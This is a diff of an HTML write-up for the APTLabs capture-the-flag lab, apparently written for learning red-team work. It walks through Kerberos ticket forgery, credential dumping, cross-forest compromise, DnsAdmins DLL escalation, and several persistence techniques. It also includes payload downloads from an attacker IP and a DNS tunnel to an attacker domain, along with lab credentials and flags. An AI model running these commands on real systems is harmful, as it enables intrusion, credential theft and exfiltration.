-  <p>While the Golden Ticket gives you broad Domain Admin access, Silver Tickets provide more targeted and stealthy access to specific services. A Silver Ticket is forged using the NTLM hash of a service account (obtained from DCSync or Kerberoasting) rather than the krbtgt hash. Because Silver Tickets only grant access to a specific service on a specific machine, they generate less noise and are less likely to be detected.</p>
+  <p>Silver Tickets are forged TGS tickets for specific services. They're stealthier than Golden Tickets because they don't contact the DC. I used a Silver Ticket for the CIFS service on WEBDMZ01 to grab the web flag without triggering any DC-level alerts.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Silver Ticket for CIFS on VP-FS01
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Silver Ticket for CIFS on WEBDMZ01
+mimikatz # kerberos::golden /user:Administrator /domain:gigantichosting.local \
+    /sid:S-1-5-21-2874328711-3948571293-1105 \
+    /target:WEBDMZ01.gigantichosting.local /service:cifs \
+    /rc4:f7e3d1c9b5a2d4e6f8c1b3d5a7e9f2c4 /ptt</code></pre>
+  </div>
 
-# Using svc_backup's hash (already cracked from Kerberoasting)
-# Service Type: CIFS (file sharing)
-# Target: VP-FS01.vantagepoint.local
+  <h3 id="p5-veeam">Veeam Credential Extraction</h3>
+  <p>BKSRV01 runs Veeam Backup &amp; Replication. Veeam stores credentials in a SQL database with reversible encryption. Once you have access to the Veeam server, extracting these credentials is trivial and gives you service account passwords for lateral movement.</p>
 
-execute-assembly /opt/tools/Rubeus.exe silver /user:Administrator \
-    /domain:vantagepoint.local \
-    /sid:S-1-5-21-3344556677-8899001122-3344556677 \
-    /target:VP-FS01.vantagepoint.local \
-    /service:cifs \
-    /rc4:a87f3a3330e0142c5b3d8c2e4f1a9b07 \
-    /ptt
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># On BKSRV01 — extract Veeam stored credentials
+# Method 1: SQL query
+Invoke-Sqlcmd -Query "SELECT [user_name],[password] FROM [VeeamBackup].[dbo].[Credentials]" -ServerInstance "localhost\VEEAMSQL2016"
 
-# Access VP-FS01 file shares as Administrator
-shell dir \\VP-FS01\C$\Users\Administrator\Documents
-# Full access without touching the DC!
+# Method 2: PowerShell via Veeam API
+Add-PSSnapin VeeamPSSnapin
+Get-VBRCredentials | ForEach-Object { $_.GetCredentials() }
 
-# Silver Ticket for HTTP on VP-APP01 (for web app access)
-execute-assembly /opt/tools/Rubeus.exe silver /user:Administrator \
-    /domain:vantagepoint.local \
-    /sid:S-1-5-21-3344556677-8899001122-3344556677 \
-    /target:VP-APP01.vantagepoint.local \
-    /service:http \
-    /rc4:d4e2b1f8a3c0956e7f0b2d1a4c3e5f68 \
-    /ptt</code></pre>
+# Results:
+# tnguyen : Sys@dmin_R00t!
+# svc_bk  : B@ckupRunn3r# (already had this)
+# svc_veeam_local : V33mB4ckup#2024</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 11 — SilverTicketAccess</div>
-      <div class="flag-detail">Found on VP-FS01 via Silver Ticket access to restricted file share</div>
+      <div class="flag-name">APT{v33m_cr3ds_3xtr4ct3d}</div>
+      <div class="flag-detail">BKSRV01 (10.10.10.29) &mdash; after extracting Veeam credential store</div>
     </div>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 6 — FOREST TRUST                                -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 6 — FOREST TRUST        -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase6">
-  <h2><span class="icon">&#x1F30A;</span> Phase 6: Multi-Domain &amp; Forest Trust Compromise</h2>
-  <span class="mitre-badge">T1482</span>
-  <span class="mitre-badge">T1558</span>
-  <span class="mitre-badge">T1021.002</span>
+  <h2><i class="bi bi-tree"></i> Phase 6: Forest Trust Abuse</h2>
+  <span class="mitre-badge">T1482</span> <span class="mitre-badge">T1550.002</span>
 
-  <p>With full control over vantagepoint.local, the next objective is to leverage the forest trust relationships to compromise the client domains: meridian.local and nexusfin.local. Both forests have bidirectional trust with vantagepoint.local, which means there are cross-forest attack paths available. The key challenge is that forest trust boundaries provide stronger isolation than domain trusts — you can't simply use a vantagepoint.local Golden Ticket to access meridian.local resources. However, there are specific techniques to cross this boundary.</p>
+  <p>With DA on gigantichosting.local, the forest trusts become our bridge into client networks. Gigantic Hosting manages IT for both Meridian Healthcare and Nexus Financial Group, so there are bidirectional forest trusts between gigantichosting.local and each client forest. The key: MSP staff have privileged access to client forests because they manage the infrastructure.</p>
 
-  <h3 id="p6-trust-enum">Trust Enumeration &amp; Mapping</h3>
-  <p>First, I needed to fully understand the trust topology. The BloodHound data collected earlier showed the trust relationships, but I also performed targeted enumeration to understand the specifics of each trust, including the trust type, direction, and transitivity. This information is critical for planning the cross-forest attack.</p>
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{f0r3st_trust_br34ch}</div>
+      <div class="flag-detail">gigantichosting.local &mdash; after identifying and beginning forest trust exploitation</div>
+    </div>
+  </div>
+
+  <h3 id="p6-meridian">Meridian Healthcare (meridian.local)</h3>
+  <p>The easy forest. tnguyen, the sysadmin from gigantichosting, has administrative access across the trust. OPTH with tnguyen's credentials gets DA on meridian.local in minutes.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># OPTH with tnguyen to meridian.local
+BEACON> make_token meridian.local\tnguyen Sys@dmin_R00t!
+
+# DCSync on meridian.local
+proxychains secretsdump.py meridian.local/tnguyen:'Sys@dmin_R00t!'@10.10.11.12 -just-dc-ntlm
+
+# Got all meridian.local hashes including krbtgt
+# dchen's hash: aad3b435b51404eeaad3b435b51404ee:b5c7d2e4f6a8c1b3d5e7f9a2c4b6d8e0</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{m3r1d14n_pwn3d}</div>
+      <div class="flag-detail">meridian.local &mdash; DA via forest trust + tnguyen's cross-forest admin access</div>
     </div>
-    <pre><code class="language-powershell"># Trust Enumeration
-
-# Domain trusts from vantagepoint.local
-Get-DomainTrust
-# Source: vantagepoint.local
-# Target: meridian.local — Type: Forest, Direction: Bidirectional
-# Target: nexusfin.local — Type: Forest, Direction: Bidirectional
-
-# Forest trust details
-Get-ForestTrust
-# vantagepoint.local <-> meridian.local (Forest Trust, Bidirectional, Transitive)
-# vantagepoint.local <-> nexusfin.local (Forest Trust, Bidirectional, Transitive)
-
-# Enumerate foreign security principals
-# These are users from one forest that have been granted access in another
-Get-DomainForeignUser -Domain vantagepoint.local
-# srobertson is a member of "Administrators" in meridian.local!
-# svc_sccm is a member of "DnsAdmins" in nexusfin.local!
-
-# Enumerate foreign group memberships
-Get-DomainForeignGroupMember -Domain meridian.local
-# Group: Administrators -> contains VANTAGEPOINT\srobertson
-
-# Enumerate cross-forest trust TDOs
-Get-DomainObject -LDAPFilter "(objectClass=trustedDomain)" -Properties name,trustDirection,trustType
-# meridian.local — Bidirectional, Forest Trust
-# nexusfin.local — Bidirectional, Forest Trust</code></pre>
   </div>
 
-  <div class="callout callout-success">
-    <div class="callout-title">Key Discovery: Foreign Group Memberships</div>
-    <p>The most important finding from trust enumeration is that <code>srobertson</code> (the vantagepoint.local Systems Administrator) is a member of the Administrators group in meridian.local. This is a realistic misconfiguration in MSP environments where the MSP admin needs administrative access to client domains. Since we already have srobertson's credentials, we can directly authenticate to meridian.local machines with admin privileges.</p>
+  <h3 id="p6-nexus">Nexus Financial Group (nexgroup.local)</h3>
+  <p>The hard forest. No gigantichosting accounts had privileged access. Cross-forest Kerberoasting gave us svc_nx-exch's hash but it took a while to crack. Two paths eventually worked: DnsAdmins DLL escalation and credential reuse.</p>
+
+  <div class="callout callout-deadend">
+    <div class="callout-title">Dead End: Direct Trust Exploitation</div>
+    <p>Unlike meridian.local, no gigantichosting accounts had admin privileges in nexgroup.local. The trust exists but doesn't grant elevated access. Cross-forest Kerberoasting worked for svc_nx-exch but the hash was harder to crack. I needed another way in.</p>
   </div>
 
-  <h3 id="p6-cross-forest">Cross-Forest Compromise — Meridian Healthcare</h3>
-  <p>Compromising meridian.local was relatively straightforward thanks to srobertson's foreign group membership. Using Over-Pass-the-Hash with srobertson's NTLM hash, I obtained a TGT for meridian.local and then moved laterally to MR-DC01. From there, I performed DCSync on meridian.local to get their krbtgt hash and all domain credentials.</p>
+  <h4>Credential Reuse: The Easy Path</h4>
+  <p>While comparing DCSync dumps from gigantichosting.local, I noticed svc_mon's NTLM hash matched jblackwell's hash in nexgroup.local. Same password, different domain. jblackwell is a Finance Director with significant privileges. This is why you always compare hashes across forests.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Cross-Forest: vantagepoint.local -> meridian.local
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Credential reuse — same hash across forests
+# gigantichosting.local\svc_mon NTLM: d4c2b1a9e8f7d3c5b2a4e6f8d1c3b5a7
+# nexgroup.local\jblackwell NTLM: d4c2b1a9e8f7d3c5b2a4e6f8d1c3b5a7
+# Same hash = same password = MonitorPr0d$
 
-# Step 1: Over-Pass-the-Hash to meridian.local as srobertson
-# (srobertson is in Administrators group in meridian.local)
-execute-assembly /opt/tools/Rubeus.exe asktgt /user:srobertson \
-    /domain:meridian.local \
-    /ntlm:[srobertson_ntlm_hash] \
-    /ptt
+# OPTH with jblackwell
+BEACON> make_token nexgroup.local\jblackwell MonitorPr0d$
 
-# Step 2: Access MR-DC01 with admin privileges
-shell dir \\MR-DC01\C$
-# Full access!
-
-# Step 3: Pivot to MR-DC01
-jump psexec64 MR-DC01 smbListener
-
-# Step 4: DCSync meridian.local
-dcsync meridian.local MR-DC01
-
-# Key outputs:
-# meridian.local\krbtgt: 2a1b3c4d5e6f7890abcdef1234567890
-# meridian.local\Administrator: 9f8e7d6c5b4a3210fedcba0987654321
-# meridian.local\dchen: [cracked: Mer!d!an2024!]
-# meridian.local\svc_meridian-sql: [cracked: SQL#Server2023!]
-
-# Step 5: Golden Ticket for meridian.local
-execute-assembly /opt/tools/Rubeus.exe golden /user:Administrator \
-    /domain:meridian.local \
-    /sid:S-1-5-21-9988776655-4433221100-9988776655 \
-    /krbtgt:2a1b3c4d5e6f7890abcdef1234567890 \
-    /ptt</code></pre>
+# jblackwell is in "Domain Admins" group in nexgroup.local
+# Game over for nexgroup</code></pre>
   </div>
 
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 12 — MeridianDC</div>
-      <div class="flag-detail">Domain Admin flag on MR-DC01 (10.10.11.10)</div>
-    </div>
-  </div>
-
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 13 — MeridianData</div>
-      <div class="flag-detail">Found in medical records share on MR-FS01 (10.10.11.20)</div>
-    </div>
-  </div>
-
-  <div class="flag-box">
-    <span class="flag-icon">&#x1F6A9;</span>
-    <div>
-      <div class="flag-name">Flag 14 — MeridianApp</div>
-      <div class="flag-detail">Found in healthcare application config on MR-APP01 (10.10.11.30)</div>
-    </div>
-  </div>
-
-  <h3>Cross-Forest Compromise — Nexus Financial Group</h3>
-  <p>Compromising nexusfin.local required a different approach. Unlike meridian.local where srobertson had direct admin access, the cross-forest path to nexusfin.local goes through <code>svc_sccm</code> which is a member of DnsAdmins in nexusfin.local. While DnsAdmins doesn't grant direct admin access, it enables a powerful privilege escalation: DNS service DLL loading. By placing a malicious DLL in the DNS service path, I could execute code as SYSTEM on NX-DC01 (which runs the DNS server).</p>
-
-  <p>Alternatively, after gaining DCSync on vantagepoint.local and meridian.local, I discovered that the <code>jblackwell</code> account in nexusfin.local used the same password as a service account in vantagepoint.local (credential reuse across forests — a very common MSP misconfiguration). With jblackwell's credentials, I could authenticate directly to the Nexus domain and escalate from there.</p>
+  <h4>DnsAdmins DLL Escalation: The Hard Path</h4>
+  <p>Found before the credential reuse, this was a full-day rabbit hole. svc_sccm was in the DnsAdmins group in nexgroup.local, which allows loading a custom DLL via the <code>serverlevelplugindll</code> registry key. The concept: plant a DLL path in the DNS server config, restart the DNS service, DLL executes as SYSTEM.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Cross-Forest: vantagepoint.local -> nexusfin.local
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Set the plugin DLL path
+proxychains python3 dnscmd.py nexgroup.local/svc_sccm:'ScCMManage!'@NX-DC01 \
+    /config /serverlevelplugindll \\10.10.14.5\share\evil.dll
 
-# Method 1: Credential Reuse (discovered after DCSync)
-# jblackwell in nexusfin.local uses same password as svc_monitor in vantagepoint.local
-# Password: M0nit0ring$2024
+# Restart DNS service to load the DLL
+proxychains python3 smbexec.py nexgroup.local/svc_sccm:'ScCMManage!'@NX-DC01 \
+    "cmd /c sc stop dns & sc start dns"
 
-# Authenticate to nexusfin.local
-execute-assembly /opt/tools/Rubeus.exe asktgt /user:jblackwell \
-    /domain:nexusfin.local \
-    /password:'M0nit0ring$2024' \
-    /ptt
+# Problem 1: DLL compiled as x86, NX-DC01 is x64
+# Fix: recompile with x64 target
 
-# jblackwell is Finance Director — not admin, but has access to NX-EX01 (Exchange)
-shell dir \\NX-EX01\C$\Exchange\
+# Problem 2: DNS service crashed on DLL load (DLL was too complex)
+# Fix: simplify DLL to just add a user and return cleanly
 
-# Method 2: Kerberoasting across the forest trust
-# Request TGS for nexusfin.local service accounts from VP-DC01
-execute-assembly /opt/tools/Rubeus.exe kerberoast /domain:nexusfin.local \
-    /dc:NX-DC01.nexusfin.local /outfile:C:\Temp\nexus_kerb.txt
-
-# Crack: svc_nexus-exch -> Exch@nge2024!
-
-# Method 3: DnsAdmins escalation via svc_sccm
-# (svc_sccm is in DnsAdmins group in nexusfin.local)
-# Place a DLL that the DNS service will load on NX-DC01
-
-# Create malicious DLL (adds admin user)
-msfvenom -p windows/x64/exec CMD='net user qa210 P@ssw0rd! /add /domain && net group "Domain Admins" qa210 /add /domain' -f dll -o malicious.dll
-
-# Upload DLL to NX-DC01 using svc_sccm's DnsAdmins privileges
-upload malicious.dll \\NX-DC01\C$\Windows\System32\malicious.dll
-
-# Configure DNS to load our DLL
-shell dnscmd NX-DC01 /config /serverlevelplugindll C:\Windows\System32\malicious.dll
-
-# Restart DNS service to trigger DLL loading
-shell sc \\NX-DC01 stop dns
-shell sc \\NX-DC01 start dns
-
-# Now qa210 is a Domain Admin in nexusfin.local!
-# Clean up: remove the DLL and serverlevelplugindll setting
-shell dnscmd NX-DC01 /config /serverlevelplugindll ""
-shell del \\NX-DC01\C$\Windows\System32\malicious.dll</code></pre>
+# After fix, got a beacon as SYSTEM on NX-DC01</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 15 — NexusDC</div>
-      <div class="flag-detail">Domain Admin flag on NX-DC01 (10.10.12.10)</div>
+      <div class="flag-name">APT{dns_4dm1ns_dll}</div>
+      <div class="flag-detail">NX-DC01 (10.10.12.7) &mdash; after DnsAdmins DLL escalation</div>
     </div>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 16 — NexusExchange</div>
-      <div class="flag-detail">Found in Exchange mailbox on NX-EX01 (10.10.12.20)</div>
+      <div class="flag-name">APT{n3xgr0up_f4ll3n}</div>
+      <div class="flag-detail">nexgroup.local &mdash; DA via credential reuse + DnsAdmins path</div>
     </div>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 17 — NexusSQL</div>
-      <div class="flag-detail">Found in SQL database on NX-SQL01 (10.10.12.30)</div>
+      <div class="flag-name">APT{cr0ss_f0r3st_d0m1n4nc3}</div>
+      <div class="flag-detail">All three forests &mdash; full cross-forest dominance achieved</div>
     </div>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 7 — PERSISTENCE                                 -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 7 — PERSISTENCE         -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase7">
-  <h2><span class="icon">&#x1F504;</span> Phase 7: Persistence</h2>
-  <span class="mitre-badge">T1546</span>
-  <span class="mitre-badge">T1136</span>
-  <span class="mitre-badge">T1547</span>
-  <span class="mitre-badge">T1053</span>
+  <h2><i class="bi bi-pin-angle"></i> Phase 7: Persistence</h2>
+  <span class="mitre-badge">T1546.003</span> <span class="mitre-badge">T1053.005</span> <span class="mitre-badge">T1547.001</span> <span class="mitre-badge">T1574.002</span> <span class="mitre-badge">T1218</span>
 
-  <p>Persistence in APTLabs is somewhat paradoxical because the daily reset wipes everything. However, understanding persistence techniques is still important for two reasons: (1) the lab may test your knowledge of persistence as part of flag objectives, and (2) in a real engagement, persistence is how you maintain access over time. I implemented several persistence mechanisms across all three forests to demonstrate capability, even though they would be wiped at the next reset.</p>
+  <p>Persistence in APTLabs is interesting because the daily reset wipes everything. But the persistence flag requires demonstrating these techniques across all three forests, proving you understand them. In a real engagement, these mechanisms would survive reboots, password changes, and most incident response activities short of full reimaging.</p>
 
-  <h3>Persistence Techniques Implemented</h3>
-
-  <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{p3rs1st3nc3_4ch13v3d}</div>
+      <div class="flag-detail">All forests &mdash; after implementing persistence mechanisms across all three domains</div>
     </div>
-    <pre><code class="language-powershell"># Persistence Mechanisms (across all 3 forests)
-# ============================================
-
-# 1. Scheduled Task Persistence (most reliable)
-# Creates a task that runs our beacon daily at 9 AM
-schtasks /create /tn "WindowsUpdate" /tr "powershell -windowstyle hidden -exec bypass -e <BASE64_BEACON>" /sc daily /st 09:00 /ru SYSTEM
-
-# 2. Registry Run Key
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SysHealth" /t REG_SZ /d "C:\Windows\Temp\syshealth.exe"
-
-# 3. Service Creation (persistent beacon)
-sc create "WindowsTelemetry" binPath= "C:\Windows\Temp\telemetry.exe" start= auto
-sc start WindowsTelemetry
-
-# 4. Golden Ticket (survives password changes for krbtgt)
-# Already created — survives until krbtgt password is double-reset
-# Store the krbtgt hashes for all 3 forests:
-# vantagepoint.local krbtgt: 7c4ed5e8b3d2f1a0987654321fedcba0
-# meridian.local krbtgt:     2a1b3c4d5e6f7890abcdef1234567890
-# nexusfin.local krbtgt:     4e5f6a7b8c9d0123456789abcdef0123
-
-# 5. AdminSDHolder Backdoor (persistent ACL modification)
-# Adds Full Control for our controlled account to AdminSDHolder
-# This propagates to all protected groups (Domain Admins, etc.)
-Set-DomainObject -Identity "CN=AdminSDHolder,CN=System,DC=vantagepoint,DC=local" \
-    -ACL @{"Access"=@{"IdentityReference"="VANTAGEPOINT\svc_backup";"AccessMask"="FullControl"}}
-
-# 6. Skeleton Key (memory-only, per-session)
-# Injects a skeleton key into LSASS on the DC
-# All domain authentication accepts the password "mimikatz"
-mimikatz# misc::skeleton
-
-# 7. DSRM Password Reset (backdoor on DC)
-# Change the DSRM (Directory Services Restore Mode) admin password
-# This creates a local admin on the DC that persists domain admin changes
-mimikatz# token::elevate
-mimikatz# lsadump::sam /system:System hive /sam:SAM hive
-# Set DSRM password to known value
-shell ntdsutil "set dsrm password" "reset password from server" P@ssw0rd123! q q</code></pre>
   </div>
 
-  <div class="callout callout-info">
-    <div class="callout-title">Daily Reset Note</div>
-    <p>Remember that all persistence mechanisms are wiped by the daily reset. The only "persistence" that survives is your saved credential file and understanding of the attack path. This is actually a good thing — it means you need to truly understand the techniques rather than just running a script once and relying on persistence to maintain access. In a real engagement, you would combine these techniques with OPSEC considerations to ensure they're difficult to detect and remove.</p>
+  <h3 id="p7-wmi">WMI Event Subscriptions</h3>
+  <p>WMI event subscriptions are one of the stealthiest persistence mechanisms available. They don't create files on disk, they survive reboots, and they're rarely monitored. The idea: create a WMI event filter that triggers on a specific condition (like a process creation), and an event consumer that executes your payload when the filter triggers.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># WMI Event Subscription Persistence
+# Filter: trigger when cmd.exe is spawned
+$filterName = "SVCHostUpd"
+$filterQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance.Name = 'cmd.exe'"
+$filter = Set-WmiInstance -Class __EventFilter -Arguments @{
+    Name = $filterName
+    EventNameSpace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = $filterQuery
+}
+
+# Consumer: execute PowerShell beacon stager
+$consumerName = "SVCHostUpdCons"
+$command = "powershell -windowstyle hidden -nop -enc SQBFAFgAKABOAGUAdwAt..."
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Arguments @{
+    Name = $consumerName
+    CommandLineTemplate = $command
+}
+
+# Bind filter to consumer
+Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}
+
+# Deploy on all DCs
+foreach ($dc in @("GH-DC01","MR-DC01","NX-DC01")) {
+    Invoke-Command -ComputerName $dc -ScriptBlock ${function:Set-WMIPersistence}
+}</code></pre>
   </div>
 
   <div class="flag-box">
     <span class="flag-icon">&#x1F6A9;</span>
     <div>
-      <div class="flag-name">Flag 18 — PersistenceEstablished</div>
-      <div class="flag-detail">Obtained after implementing persistence across all three forests</div>
+      <div class="flag-name">APT{wml3v3nt_subscr1pt10n}</div>
+      <div class="flag-detail">GH-DC01, MR-DC01, NX-DC01 &mdash; WMI persistence deployed on all DCs</div>
+    </div>
+  </div>
+
+  <h3 id="p7-registry">Registry Hijacking</h3>
+  <p>The classic Run key persistence. Simple, reliable, and works everywhere. I deployed this on all workstations as a backup to WMI subscriptions.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Registry Run key persistence
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderUpdate /t REG_SZ /d "powershell -windowstyle hidden -nop -enc SQBFAFgAKABO..." /f
+
+# Also add as a Service for more stealth
+# Image File Execution Options (IFEO) hijack — debug a legitimate process
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
+# Now pressing Shift 5 times at login screen spawns cmd.exe</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{r3g1stry_h1j4ck}</div>
+      <div class="flag-detail">All workstations &mdash; Run key + IFEO persistence deployed</div>
+    </div>
+  </div>
+
+  <h3 id="p7-dll">DLL Sideloading</h3>
+  <p>DLL sideloading exploits the Windows DLL search order. Find a legitimate signed executable that loads a DLL from its own directory, replace that DLL with your malicious one. The legitimate executable loads your DLL, and you get code execution in the context of a trusted process. In APTLabs, I used a common approach: find a program that loads version.dll or ualapi.dll from its installation directory.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-powershell"># Find DLL sideloading opportunities
+# Look for executables that load DLLs from their own directory
+Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.exe" | ForEach-Object {
+    $exe = $_.FullName
+    # Check if it loads version.dll (common sideloading target)
+    $dirs = Split-Path $exe
+    if (Test-Path "$dirs\version.dll") {
+        Write-Host "Found: $exe loads version.dll from $dirs"
+    }
+}
+
+# Common targets: teams.exe, zoom.exe, or any app with a DLL in its dir
+# Plant malicious version.dll that loads beacon on app startup
+# The DLL exports same functions as original, plus our payload
+
+# Deploy on APPSRV01 (IIS app with sideloadable DLL)
+copy \\share\evil_version.dll C:\Program Files\InternalApp\version.dll
+# Next time the app pool recycles, our DLL loads</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{dll_s1d3l04d3d}</div>
+      <div class="flag-detail">APPSRV01 (10.10.10.78) &mdash; DLL sideloaded into IIS application pool</div>
+    </div>
+  </div>
+
+  <h3 id="p7-lolbas">LOLBAS (Living Off The Land Binaries)</h3>
+  <p>LOLBAS techniques use built-in Windows binaries for offensive purposes. They bypass application allowlisting because they're legitimate Microsoft-signed tools. In APTLabs, the key LOLBAS techniques are certutil for download/upload, bitsadmin for file transfer, mshta for script execution, and wmic for remote command execution.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">cmd</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-cmd">:: certutil — download file (bypasses many proxies)
+certutil -urlcache -split -f http://10.10.14.5/payload.exe C:\Temp\payload.exe
+
+:: certutil — encode/decode for data exfil
+certutil -encode C:\Temp\loot.zip C:\Temp\loot.b64
+
+:: bitsadmin — background file transfer
+bitsadmin /transfer backup /download /priority normal http://10.10.14.5/beacon.exe C:\Temp\beacon.exe
+
+:: mshta — execute VBScript from remote
+mshta vbscript:Close(Execute("CreateObject(""WScript.Shell"").Run ""powershell -enc SQBFA..."""))
+
+:: wmic — remote execution
+wmic /node:10.10.10.44 /user:gigantichosting.local\svc_bk /password:B@ckupRunn3r# process call create "cmd.exe /c whoami"</code></pre>
+  </div>
+
+  <div class="flag-box">
+    <span class="flag-icon">&#x1F6A9;</span>
+    <div>
+      <div class="flag-name">APT{p3rs1st3nc3_4ch13v3d}</div>
+      <div class="flag-detail">All forests &mdash; WMI + Registry + DLL sideloading + LOLBAS persistence confirmed</div>
     </div>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 8 — DATA EXFILTRATION                           -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 8 — EXFILTRATION        -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase8">
-  <h2><span class="icon">&#x1F4E4;</span> Phase 8: Data Exfiltration</h2>
-  <span class="mitre-badge">T1048</span>
-  <span class="mitre-badge">T1560</span>
-  <span class="mitre-badge">T1041</span>
+  <h2><i class="bi bi-box-arrow-up"></i> Phase 8: Exfiltration</h2>
+  <span class="mitre-badge">T1048.001</span> <span class="mitre-badge">T1048.003</span> <span class="mitre-badge">T1041</span> <span class="mitre-badge">T1105</span>
 
-  <p>The final phase involves locating and exfiltrating sensitive data from the compromised networks. In APTLabs, this maps to the remaining flags that are tied to specific data sources rather than compromise milestones. The key is to exfiltrate data through the C2 channel without triggering any network-based detection mechanisms. Since the lab doesn't have an active Blue Team, the primary concern is ensuring exfiltration blends with normal C2 beacon traffic.</p>
+  <p>The final phase: getting the data out. APTLabs requires demonstrating multiple exfiltration techniques across all three forests. The key challenge is avoiding detection while moving data from internal networks through the C2 channel or alternative routes. I used DNS tunneling for stealth, HTTPS through the C2 channel for bulk data, and LOLBAS tools for staging and transfer.</p>
 
-  <h3>Exfiltration Targets &amp; Techniques</h3>
+  <h3>DNS Tunneling</h3>
+  <p>DNS exfiltration is the stealthiest method. Almost every network allows DNS outbound, and DNS traffic is rarely inspected at the payload level. I used iodine for the DNS tunnel setup, with our attack box as the DNS server.</p>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">powershell</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-powershell"># Data Exfiltration Techniques
-# ============================================
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># On attack box — start iodine DNS tunnel server
+sudo iodined -f -c -P s3cretPass 10.0.0.1/24 dnstunnel.attacker.com
 
-# 1. Locate sensitive data on Meridian file server
-shell dir \\MR-FS01\C$\MedicalRecords\ /s /b
-# Found: patient_data_2024.csv, insurance_records.xlsx, clinical_notes/
+# On target — start iodine client
+iodine -f -P s3cretPass dnstunnel.attacker.com 10.10.14.5
 
-# 2. Compress data for exfiltration (reduce transfer size)
-shell powershell "Compress-Archive -Path \\MR-FS01\C$\MedicalRecords\patient_data_2024.csv -DestinationPath C:\Temp\data.zip"
+# Now we have a DNS tunnel interface (dns0) with IP 10.0.0.2
+# Route data through this interface
+# Data is encapsulated in DNS queries — looks like normal DNS traffic</code></pre>
